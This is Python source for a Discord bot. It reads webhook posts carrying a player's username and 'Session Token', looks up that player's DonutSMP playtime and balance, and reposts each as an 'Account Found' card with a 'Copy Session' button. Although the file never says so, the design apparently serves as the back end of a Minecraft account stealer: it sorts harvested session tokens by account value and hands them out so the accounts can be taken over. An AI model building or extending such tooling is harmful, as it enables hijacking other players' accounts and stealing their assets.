import discord
from discord.ext import commands
from discord.ui import Button, View
import re
import os
import asyncio
import logging
import aiohttp
from aiohttp import web

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
INPUT_CHANNEL_ID = int(os.environ.get('INPUT_CHANNEL_ID', 0))
OUTPUT_CHANNEL_ID = int(os.environ.get('OUTPUT_CHANNEL_ID', 0))
PORT = int(os.environ.get('PORT', 8080))
API_KEY = os.environ.get('DONUTSMP_API_KEY')

if not TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
if not INPUT_CHANNEL_ID:
    raise ValueError("INPUT_CHANNEL_ID environment variable not set")
if not OUTPUT_CHANNEL_ID:
    raise ValueError("OUTPUT_CHANNEL_ID environment variable not set")
if not API_KEY:
    raise ValueError("DONUTSMP_API_KEY environment variable not set")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

class AccountView(View):
    def __init__(self, username, session_token, playtime, balance):
        super().__init__(timeout=None)
        self.username = username
        self.session_token = session_token
        self.playtime = playtime
        self.balance = balance
        
        session_btn = Button(label="Copy Session", style=discord.ButtonStyle.primary)
        session_btn.callback = self.session_callback
        self.add_item(session_btn)
        
        ign_btn = Button(label="Copy IGN", style=discord.ButtonStyle.secondary)
        ign_btn.callback = self.ign_callback
        self.add_item(ign_btn)
    
    async def session_callback(self, interaction):
        await interaction.response.send_message(f"```\n{self.session_token}\n```", ephemeral=True)
        logger.info(f"Session copied by {interaction.user}")
    
    async def ign_callback(self, interaction):
        await interaction.response.send_message(f"```\n{self.username}\n```", ephemeral=True)
        logger.info(f"IGN copied by {interaction.user}")

def parse_account_data(content):
    username = re.search(r'Username:\s*(\S+)', content, re.IGNORECASE)
    session = re.search(r'Session Token:\s*(\S+)', content, re.IGNORECASE)
    
    return (
        username.group(1) if username else None,
        session.group(1) if session else None
    )

def format_playtime(seconds):
    """Convert seconds to hours and minutes"""
    try:
        if seconds is None:
            return "Unknown"
        
        # Convert to float first to handle various formats
        seconds_float = float(seconds)
        seconds_int = int(seconds_float)
        
        if seconds_int > 0:
            hours = seconds_int // 3600
            minutes = (seconds_int % 3600) // 60
            return f"{hours:,}h {minutes}m"
        else:
            return "0h 0m"
    except (ValueError, TypeError) as e:
        logger.error(f"Error formatting playtime '{seconds}': {e}")
        return "Unknown"

def format_balance(balance_str):
    """Format balance with commas, handling scientific notation"""
    try:
        if balance_str is None:
            return "Unknown"
        
        # Handle scientific notation (like 8.915681500000001e+5)
        balance_float = float(balance_str)
        balance_int = int(balance_float)
        
        if balance_int > 0:
            return f"${balance_int:,}"
        else:
            return "$0"
    except (ValueError, TypeError) as e:
        logger.error(f"Error formatting balance '{balance_str}': {e}")
        return "Unknown"

async def fetch_donutsmp_stats(username):
    """Fetch player stats from DonutSMP API using the stats endpoint"""
    headers = {"Authorization": f"Bearer {API_KEY}"}
    stats_url = f"https://api.donutsmp.net/v1/stats/{username}"
    
    async with aiohttp.ClientSession() as session:
        try:
            logger.info(f"Fetching stats for {username}")
            async with session.get(stats_url, headers=headers) as response:
                logger.info(f"Response status for {username}: {response.status}")
                
                if response.status == 200:
                    data = await response.json()
                    logger.info(f"Raw response data for {username}: {data}")
                    
                    # Check if data exists and has result
                    if not data:
                        logger.warning(f"Empty response data for {username}")
                        return "Unknown", "Unknown", False
                    
                    # The stats might be in the "result" object or directly in data
                    stats = data.get("result", data)
                    
                    if stats:
                        # Get playtime - try different possible field names
                        playtime_raw = stats.get("playtime") or stats.get("Playtime") or stats.get("timePlayed") or 0
                        logger.info(f"Raw playtime for {username}: {playtime_raw}")
                        playtime = format_playtime(playtime_raw)
                        
                        # Get balance - try different possible field names
                        balance_raw = stats.get("money") or stats.get("Money") or stats.get("balance") or stats.get("Balance") or 0
                        logger.info(f"Raw balance for {username}: {balance_raw}")
                        balance = format_balance(balance_raw)
                        
                        logger.info(f"Successfully fetched stats for {username}: playtime={playtime}, balance={balance}")
                        return playtime, balance, True
                    else:
                        logger.warning(f"No stats data found for {username}")
                        return "Unknown", "Unknown", False
                
                elif response.status == 401:
                    logger.error("API key is invalid or unauthorized")
                    return "Unknown", "Unknown", False
                
                elif response.status == 500:
                    logger.info(f"Player {username} does not exist (received 500 status)")
                    return "Unknown", "Unknown", False
                
                else:
                    logger.warning(f"Unexpected response status {response.status} for {username}")
                    return "Unknown", "Unknown", False
                    
        except Exception as e:
            logger.error(f"Error fetching DonutSMP stats for {username}: {e}")
            return "Unknown", "Unknown", False

@bot.event
async def on_ready():
    logger.info(f'{bot.user} has connected to Discord!')
    logger.info(f'Monitoring input channel: {INPUT_CHANNEL_ID}')
    logger.info(f'Posting to output channel: {OUTPUT_CHANNEL_ID}')
    
    input_channel = bot.get_channel(INPUT_CHANNEL_ID)
    output_channel = bot.get_channel(OUTPUT_CHANNEL_ID)
    
    if input_channel:
        logger.info(f'Input channel found: #{input_channel.name}')
    else:
        logger.error(f'Could not find input channel with ID {INPUT_CHANNEL_ID}')
    
    if output_channel:
        logger.info(f'Output channel found: #{output_channel.name}')
    else:
        logger.error(f'Could not find output channel ID {OUTPUT_CHANNEL_ID}')
    
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=".jarrr"))

@bot.event
async def on_message(message):
    if message.author.id == bot.user.id:
        return
    
    if message.channel.id == INPUT_CHANNEL_ID and message.webhook_id:
        logger.info(f"Webhook received in input channel #{message.channel.name}")
        logger.info(f"Message content: {message.content}")
        
        username, session = parse_account_data(message.content)
        
        if not username or not session:
            logger.warning("Could not parse username or session from webhook")
            return
        
        logger.info(f"Parsed username: {username}, session: {session[:20]}...")  # Log partial session
        
        playtime, balance, valid = await fetch_donutsmp_stats(username)
        
        output_channel = bot.get_channel(OUTPUT_CHANNEL_ID)
        if not output_channel:
            logger.error(f"Could not find output channel {OUTPUT_CHANNEL_ID}")
            return
        
        if not valid:
            embed = discord.Embed(
                title="Account Found",
                description=f"**{username}** is not a valid DonutSMP Account",
                color=0x333333
            )
            await output_channel.send(embed=embed)
            logger.info(f"Invalid account alert sent for {username}")
            return
        
        embed = discord.Embed(
            title="Account Found",
            description=f"**{username}**",
            color=0x5865F2
        )
        embed.add_field(name="Playtime", value=playtime, inline=True)
        embed.add_field(name="Balance", value=balance, inline=True)
        
        view = AccountView(username, session, playtime, balance)
        await output_channel.send(embed=embed, view=view)
        logger.info(f"Account embed sent to output channel for {username}")
    
    await bot.process_commands(message)

@bot.command(name='lookup')
async def lookup(ctx, username: str):
    """Lookup a player's DonutSMP stats"""
    async with ctx.typing():
        playtime, balance, valid = await fetch_donutsmp_stats(username)
        
        if not valid:
            embed = discord.Embed(
                title="Invalid Account",
                description=f"**{username}** does not exist on DonutSMP",
                color=0xff0000
            )
            await ctx.send(embed=embed)
            return
        
        embed = discord.Embed(
            title=f"DonutSMP Stats - {username}",
            color=0x5865F2
        )
        embed.add_field(name="Playtime", value=playtime, inline=True)
        embed.add_field(name="Balance", value=balance, inline=True)
        
        await ctx.send(embed=embed)

@bot.command(name='ping')
async def ping(ctx):
    await ctx.send(f'Pong! `{round(bot.latency * 1000)}ms`')

@bot.command(name='stats')
async def stats(ctx):
    total_users = sum(g.member_count for g in bot.guilds)
    embed = discord.Embed(title="Bot Statistics", color=0x5865F2)
    embed.add_field(name="Guilds", value=f"`{len(bot.guilds)}`")
    embed.add_field(name="Users", value=f"`{total_users}`")
    embed.add_field(name="Latency", value=f"`{round(bot.latency * 1000)}ms`")
    await ctx.send(embed=embed)

async def health_check(request):
    return web.Response(text="Bot is operational")

async def start_webserver():
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    logger.info(f"Health check server running on port {PORT}")

async def main():
    asyncio.create_task(start_webserver())
    async with bot:
        await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
